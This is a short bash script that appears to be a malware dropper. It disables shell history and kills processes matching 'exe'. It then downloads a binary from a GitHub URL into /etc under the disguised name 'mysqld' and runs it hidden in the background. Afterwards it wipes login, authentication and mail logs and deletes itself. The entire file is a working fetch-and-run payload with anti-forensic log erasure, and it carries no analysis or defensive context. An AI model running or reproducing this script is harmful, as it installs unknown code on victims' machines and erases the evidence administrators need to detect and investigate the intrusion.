#!/bin/bash

set +o history
kill -9 $(ps aux | pgrep exe)
cd /etc
rm -rf mysqld
get_arch=$(uname -m)

# if [[ $get_arch =~ "x86_64" ]];then
    curl -O -fskSL https://github.com/ConlinChow/drivers/raw/refs/heads/main/mysqld
    chmod +x mysqld
    nohup ./mysqld > /dev/null 2>&1 &
# else
#     echo "unknown!!"
# fi

echo > /var/log/lastlog
echo > /var/log/utmp
echo > /var/log/wtmp
echo > /var/log/btmp
cat /dev/null > /var/log/secure
cat /dev/null > /var/log/message
cat /dev/null > /var/spool/mail/root
cat /dev/null > /var/log/auth.log

rm -rf ~/mysqld.sh